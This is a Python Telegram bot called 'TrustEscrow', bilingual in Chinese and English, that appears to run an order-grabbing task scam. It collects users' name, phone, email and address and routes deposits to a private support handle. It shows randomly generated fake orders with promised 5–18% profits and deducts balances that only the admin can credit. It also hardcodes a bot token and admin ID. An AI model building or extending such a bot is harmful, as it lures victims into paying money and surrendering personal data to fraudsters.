# -*- coding: utf-8 -*-
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import random
from datetime import datetime

# ===================== 核心配置 =====================
BOT_TOKEN = "8727191543:AAF0rax78kPycp0MqahZgpjqdrrtJQbjj_I"
ADMIN_ID = 6365510771
bot = telebot.TeleBot(BOT_TOKEN)

# ===================== 双语文案 =====================
TEXT = {
    "zh": {
        "home": "🏠 TrustEscrow 專業擔保平台\n\n安全．透明．快速．可靠\n\n客服支援：@fcff88",
        "reg_title": "🏠 入駐擔保申請\n（需通過審核才能使用平台）\n\n請依序填寫：\n1. 真實姓名\n2. 聯絡電話\n3. 電子信箱\n4. 居住地址\n5. 推薦人ID",
        "profile": "👤 個人中心\n🆔 用戶ID：{}\n💰 可用餘額：{:.2f} USDT\n📌 審核狀態：{}\n\n⏳ 未完成訂單：\n{}\n\n✅ 已完成訂單：\n{}",
        "grab": "🚀 搶單大廳\n隨機訂單｜搶單利潤 5%\n\n可搶訂單：\n{}",
        "deposit": "💰 儲值 & 提現\n所有業務請聯繫官方客服：\n➡️ @fcff88",
        "record": "📜 擔保記錄\n{}",
        "order_item": "• #{}｜{} USDT｜{}｜{}",
        "no_order": "• 無",
        "status_wait": "未處理",
        "status_doing": "已接單",
        "status_done": "已完成",
        "reg_success": "✅ 入駐申請已提交，請等待管理員審核",
        "grab_success": "✅ 搶單成功，請等待管理員結算",
        "accept_success": "✅ 接單成功，已扣除金額",
        "not_enough": "❌ 餘額不足，無法接單",
        "not_verified": "❌ 未通過審核，無法操作",
        "admin_assign": "✅ 已成功派單給用戶",
        "admin_done": "✅ 訂單已完成，利潤已發放",
        "admin_verify": "✅ 用戶審核通過",
        "lang": "🌐 English",
        "btn_reg": "入駐擔保",
        "btn_profile": "個人中心",
        "btn_grab": "搶單大廳",
        "btn_deposit": "儲值提現",
        "btn_record": "擔保記錄",
        "btn_accept": "接單",
        "btn_back": "返回首頁"
    },
    "en": {
        "home": "🏠 TrustEscrow Professional Platform\n\nSafe．Transparent．Fast．Reliable\n\nSupport: @fcff88",
        "reg_title": "🏠 Escrow Registration\n(Verify required)\n\nFill in:\n1. Full Name\n2. Phone\n3. Email\n4. Address\n5. Referrer ID",
        "profile": "👤 Profile\n🆔 ID: {}\n💰 Balance: {:.2f} USDT\n📌 Status: {}\n\n⏳ Pending:\n{}\n\n✅ Completed:\n{}",
        "grab": "🚀 Grab Order\nRandom orders｜Profit 5%\n\nAvailable:\n{}",
        "deposit": "💰 Deposit & Withdraw\nContact support: ➡️ @fcff88",
        "record": "📜 Record\n{}",
        "order_item": "• #{}｜{} USDT｜{}｜{}",
        "no_order": "• None",
        "status_wait": "Pending",
        "status_doing": "Accepted",
        "status_done": "Completed",
        "reg_success": "✅ Applied, wait for verify",
        "grab_success": "✅ Grabbed, wait for finish",
        "accept_success": "✅ Accepted, amount deducted",
        "not_enough": "❌ Not enough USDT",
        "not_verified": "❌ Not verified",
        "admin_assign": "✅ Order assigned",
        "admin_done": "✅ Order completed",
        "admin_verify": "✅ User verified",
        "lang": "🌐 繁中",
        "btn_reg": "Register",
        "btn_profile": "Profile",
        "btn_grab": "Grab",
        "btn_deposit": "Deposit",
        "btn_record": "Record",
        "btn_accept": "Accept",
        "btn_back": "Home"
    }
}

# ===================== 數據 =====================
user_lang = {}
user_step = {}
user_balance = {}
user_verify = {}  # 0=未申請 1=審核中 2=通過
user_info = {}
orders = {}
order_id = 1

# ===================== 菜單 =====================
def main_menu(user_id):
    lang = user_lang.get(user_id, "zh")
    t = TEXT[lang]
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton(t["btn_reg"], callback_data="reg"),
        InlineKeyboardButton(t["btn_profile"], callback_data="profile"),
        InlineKeyboardButton(t["btn_grab"], callback_data="grab"),
        InlineKeyboardButton(t["btn_deposit"], callback_data="deposit"),
        InlineKeyboardButton(t["btn_record"], callback_data="record"),
        InlineKeyboardButton(t["lang"], callback_data="lang"),
    )
    return m

def back_menu(user_id):
    lang = user_lang.get(user_id, "zh")
    t = TEXT[lang]
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton(t["btn_back"], callback_data="home"))
    return m

def accept_btn(user_id, oid):
    lang = user_lang.get(user_id, "zh")
    t = TEXT[lang]
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton(t["btn_accept"], callback_data=f"accept_{oid}"))
    m.add(InlineKeyboardButton(t["btn_back"], callback_data="profile"))
    return m

# ===================== 啟動 =====================
@bot.message_handler(commands=["start"])
def start(msg):
    u = msg.from_user.id
    user_lang.setdefault(u, "zh")
    user_step[u] = None
    user_balance.setdefault(u, 0.0)
    user_verify.setdefault(u, 0)
    t = TEXT[user_lang[u]]
    bot.send_message(u, t["home"], reply_markup=main_menu(u))

# ===================== 按鈕 =====================
@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    u = c.from_user.id
    lang = user_lang.get(u, "zh")
    t = TEXT[lang]
    try:
        if c.data == "home":
            bot.edit_message_text(t["home"], u, c.message.id, reply_markup=main_menu(u))

        elif c.data == "lang":
            user_lang[u] = "en" if lang == "zh" else "zh"
            t = TEXT[user_lang[u]]
            bot.edit_message_text(t["home"], u, c.message.id, reply_markup=main_menu(u))

        elif c.data == "profile":
            pending = []
            completed = []
            for oid, o in orders.items():
                if o["user"] == u:
                    s = t["status_done"] if o["status"] == 2 else t["status_doing"] if o["status"] == 1 else t["status_wait"]
                    line = t["order_item"].format(oid, o["amount"], "派單" if o["type"] == "assign" else "搶單", s)
                    if o["status"] == 2: completed.append(line)
                    else: pending.append(line)
            p_text = "\n".join(pending) if pending else t["no_order"]
            c_text = "\n".join(completed) if completed else t["no_order"]
            v_text = "未通過" if user_verify[u] < 2 else "已通過" if lang == "zh" else "Not Verified" if user_verify[u] < 2 else "Verified"
            text = t["profile"].format(u, user_balance.get(u,0), v_text, p_text, c_text)
            bot.edit_message_text(text, u, c.message.id, reply_markup=back_menu(u))

        elif c.data == "grab":
            if user_verify.get(u,0) < 2:
                bot.answer_callback_query(c.id, t["not_verified"], show_alert=True)
                return
            orders_list = []
            for i in range(3):
                amt = round(random.uniform(10, 50), 2)
                orders_list.append(f"• #{i+1}｜{amt} USDT")
            if random.random() < 0.1:
                big = round(random.uniform(50,100),2)
                orders_list.append(f"• #HOT｜{big} USDT 🔥")
            text = t["grab"].format("\n".join(orders_list))
            bot.edit_message_text(text, u, c.message.id, reply_markup=back_menu(u))
            global order_id
            oid = order_id
            order_id +=1
            amount = round(random.uniform(10,50),2)
            orders[oid] = {"user":u, "amount":amount, "type":"grab", "status":0}
            bot.send_message(u, t["grab_success"])

        elif c.data.startswith("accept_"):
            oid = int(c.data.split("_")[1])
            o = orders.get(oid)
            if not o or o["user"] != u or o["status"] != 0:
                bot.answer_callback_query(c.id, "Error")
                return
            if user_balance.get(u,0) < o["amount"]:
                bot.answer_callback_query(c.id, t["not_enough"], show_alert=True)
                return
            user_balance[u] -= o["amount"]
            o["status"] = 1
            bot.edit_message_text(t["accept_success"], u, c.message.id, reply_markup=back_menu(u))

        elif c.data == "deposit":
            bot.edit_message_text(t["deposit"], u, c.message.id, reply_markup=back_menu(u))

        elif c.data == "record":
            lines = []
            for oid, o in orders.items():
                if o["user"] == u:
                    s = t["status_done"] if o["status"] == 2 else t["status_doing"] if o["status"] ==1 else t["status_wait"]
                    lines.append(t["order_item"].format(oid, o["amount"], "派單" if o["type"]=="assign" else "搶單", s))
            text = t["record"].format("\n".join(lines) if lines else t["no_order"])
            bot.edit_message_text(text, u, c.message.id, reply_markup=back_menu(u))

    except Exception as e:
        pass

# ===================== 管理員命令 =====================
@bot.message_handler(func=lambda msg: msg.from_user.id == ADMIN_ID)
def admin(msg):
    u = msg.from_user.id
    txt = msg.text.strip()
    parts = txt.split()
    try:
        # 派單 用户ID 金额
        if parts[0] == "派单" and len(parts) ==3:
            target = int(parts[1])
            amt = float(parts[2])
            global order_id
            oid = order_id
            order_id +=1
            orders[oid] = {"user":target, "amount":amt, "type":"assign", "status":0}
            bot.send_message(u, TEXT["zh"]["admin_assign"])
            bot.send_message(target, f"📥 你有新的派單 #{oid}｜{amt} USDT")

        # 完成 订单号
        elif parts[0] == "完成" and len(parts)==2:
            oid = int(parts[1])
            o = orders[oid]
            o["status"] =2
            profit = o["amount"] * 0.18 if o["type"] =="assign" else o["amount"]*0.05
            user_balance[o["user"]] += o["amount"] + profit
            bot.send_message(u, TEXT["zh"]["admin_done"])
            bot.send_message(o["user"], f"✅ 訂單 #{oid} 已完成，利潤已發放")

        # 审核通过 用户ID
        elif parts[0] == "审核通过" and len(parts)==2:
            target = int(parts[1])
            user_verify[target] =2
            bot.send_message(u, TEXT["zh"]["admin_verify"])
            bot.send_message(target, "✅ 你的入駐已通過審核")
    except:
        pass

# ===================== 運行 =====================
if __name__ == "__main__":
    print("✅ 机器人启动成功")
    bot.infinity_polling()
